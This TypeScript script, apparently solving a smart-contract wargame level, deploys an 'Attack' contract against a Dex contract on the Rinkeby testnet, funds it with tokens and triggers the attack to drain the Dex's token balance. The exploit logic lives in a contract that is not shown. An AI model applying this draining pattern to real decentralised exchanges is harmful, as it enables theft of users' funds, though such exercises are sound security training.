import { getDefaultProvider } from '@ethersproject/providers';
import { Wallet, utils } from 'ethers';
import { readFileSync } from 'fs-extra';
import path from 'path/posix';
import { Attack__factory, Dex__factory, ERC20__factory } from '../types/ethers-contracts';

// import {  } from '../types/ethers-contracts';

// const provider = getDefaultProvider("http://127.0.0.1:8545");
const provider = getDefaultProvider("rinkeby");
const testPrivKey = readFileSync(path.resolve(__dirname, "./../../../.privkey")).toString().trim();
// const testPrivKey = "";
const addr = "0x52eBcd8D44fDBDEe5F6ebf1E62D0b4AC785Add7E"

function toWei(eth: number) {
  return utils.parseEther(eth.toString())
}

async function main() {
  let alice = new Wallet(testPrivKey);
  alice = alice.connect(provider);

  const dex = Dex__factory.connect(addr, provider).connect(alice);
  (new Attack__factory(alice)).deploy(addr).then(async attack => {
    // transfer token
    const token1 = ERC20__factory.connect(await attack.token1(), provider).connect(alice);
    const token2 = ERC20__factory.connect(await attack.token2(), provider).connect(alice);

    await token1.transfer(attack.address, 10)
    await token2.transfer(attack.address, 10)
    
    // start attack
    attack.attack().then(async () => {
      console.log(await dex.balanceOf(await dex.token1(), addr))
    })
  })

}

main().catch(e => {
  console.log("Error: " + e)
})
